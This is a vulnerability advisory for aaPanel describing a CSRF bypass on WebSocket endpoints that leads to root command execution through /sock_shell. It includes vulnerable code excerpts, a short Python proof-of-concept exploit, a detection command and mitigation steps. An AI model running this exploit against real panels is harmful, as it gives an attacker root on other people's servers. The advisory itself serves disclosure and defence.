# aaPanel WebSocket CSRF Bypass → RCE

## Incomplete fix for CVE-2021-37840

**Discovered by:** EON Security  
**CVE:** Pending assignment  
**CVSS:** 8.8 (High) — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H  
**Affected:** aaPanel all versions since 6.8.12 (2021) through latest 7.65.0  
**Installed base:** 3.6M+ servers  

---

## TL;DR

aaPanel's fix for CVE-2021-37840 (Cross-Site WebSocket Hijacking) is **incomplete**. The CSRF token `request_token_head` is **never initialized** in WebSocket request contexts. This means the `check_csrf_websocket()` comparison is always against an empty string — and an attacker-supplied empty `x-http-token` passes the check.

All 10 WebSocket endpoints (`/webssh`, `/sock_shell`, `/ws_panel`, `/ws_home`, `/ws_project`, `/ws_model`, `/workorder_client`, and their `/v2/*` variants) accept connections **before** authentication is verified (returning HTTP 101), with auth only checked at the application layer after the WebSocket is established.

Combined with `/sock_shell` executing arbitrary shell commands via `subprocess.Popen(cmd + " 2>&1", shell=True)`, an attacker who tricks a logged-in admin into visiting a malicious page achieves **remote code execution as root**.

This is the **10th CVE ever** assigned to aaPanel in its 6+ year history.

---

## Vulnerability Details

### Root Cause: Uninitialized CSRF Token in WebSocket Context

The `check_csrf_websocket()` function in `BTPanel/__init__.py`:

```python
def check_csrf_websocket(ws, args):
    if g.is_aes: return True
    if g.api_request: return True
    if public.is_debug(): return True
    is_success = True
    if not 'x-http-token' in args:
        is_success = False
    if is_success:
        if public.get_csrf_sess_html_token_value() != args['x-http-token']:
            is_success = False
    if not is_success:
        ws.send('token error')
        return False
    return True
```

The function calls `get_csrf_sess_html_token_value()` which returns `session.get('request_token_head', "")`. 

The CSRF token `request_token_head` is **only initialized** during HTTP GET requests to the panel's main route (`/`) — and only for logged-in users with `apsess_verified` set. In WebSocket contexts, **neither condition is met**, so `session['request_token_head']` is never set.

**The bypass:** Sending `{"x-http-token": ""}` as the first WebSocket message causes the comparison `"" != ""` to evaluate to `False`, bypassing the check entirely.

### WebSocket Endpoints Accept Connections Before Auth

All WebSocket endpoints return HTTP 101 Switching Protocols **before** any authentication check. The `comm.local()` auth check runs inside the handler, after the WebSocket upgrade is already complete:

```python
@sockets.route('/sock_shell')
def sock_shell(ws):
    comReturn = comm.local()     # ← Auth check happens AFTER 101
    if comReturn:
        ws.send(str(comReturn))
        return
```

### Command Execution via sock_shell

The `/sock_shell` endpoint passes attacker-supplied strings directly to `subprocess.Popen` with `shell=True`:

```python
def sock_recv(cmdstring, ws):
    p = subprocess.Popen(cmdstring + " 2>&1",
                         close_fds=True,
                         shell=True,           # ← Arbitrary command execution
                         stdout=subprocess.PIPE,
                         stderr=subprocess.PIPE)
```

### SSH Proxy via webssh

The `/webssh` endpoint accepts attacker-supplied SSH connection parameters:

```python
ssh_info['host'] = get['host'].strip()
ssh_info['port'] = int(get['port'])
ssh_info['username'] = get['username'].strip()
ssh_info['password'] = get['password'].strip()
```

---

## Affected Endpoints

| Endpoint | Function | Impact |
|----------|----------|--------|
| `/webssh` | SSH terminal proxy | Connect to arbitrary SSH hosts with attacker credentials |
| `/sock_shell` | Direct command execution | **RCE as root** via shell commands |
| `/ws_panel` | Panel management | Panel operations |
| `/ws_home` | Dashboard | Data access |
| `/ws_project` | Project management | Data access |
| `/ws_model` | Model management | Data access |
| `/workorder_client` | Ticket system | Ticket access |
| `/v2/*` | All v2 variants | Same as above |

---

## PoC

```python
import asyncio, json, subprocess, websockets

async def exploit(target, command):
    async with websockets.connect(f"wss://{target}/sock_shell") as ws:
        # Step 1: Bypass CSRF check with empty token
        await ws.send(json.dumps({"x-http-token": ""}))
        resp = await ws.recv()
        if "token error" in resp:
            return None
        # Step 2: Execute command
        await ws.send(command)
        return await ws.recv()

# Usage (requires victim to be logged into aaPanel):
# output = await exploit("victim-panel:8888", "id")
# print(output)
```

Full PoC: [exploit.py](exploit.py)

---

## Detection

Use the [check.py](check.py) script to test if an aaPanel instance has vulnerable WebSocket endpoints:

```bash
python3 check.py https://target:8888
```

---

## Mitigation

1. **Check authentication BEFORE accepting WebSocket upgrades** — return HTTP 401 at handshake level
2. **Initialize CSRF token for WebSocket sessions** — ensure `session['request_token_head']` is set
3. **Validate Origin header** on WebSocket upgrade — reject connections from unknown origins
4. **Disable sock_shell** if not required — the endpoint provides direct root command execution
5. **Restrict network access** to aaPanel administration interface

---

## Timeline

| Date | Event |
|------|-------|
| 2021-08-02 | CVE-2021-37840 disclosed (aaPanel CSWSH) |
| 2021 | Vendor adds `check_csrf_websocket()` as fix |
| 2026-06-23 | EON Security discovers fix is incomplete |
| 2026-06-23 | Vendor notified |
| Pending | CVE assignment |
| Pending | Public disclosure |

---

## References

- [CVE-2021-37840](https://nvd.nist.gov/vuln/detail/CVE-2021-37840) — Original aaPanel CSWSH
- [CVE-2026-29859](https://nvd.nist.gov/vuln/detail/CVE-2026-29859) — aaPanel arbitrary file upload (Mar 2026)
- [aaPanel GitHub](https://github.com/aaPanel/aaPanel) — Official repository
- [EON Security](https://eonsecurity.co.za) — Discoverer

---

## Credit

**Yadav** — EON Security  
Website: [https://eonsecurity.co.za](https://eonsecurity.co.za)

---

## License

This content is licensed under MIT. The PoC is provided for educational and defensive purposes only.
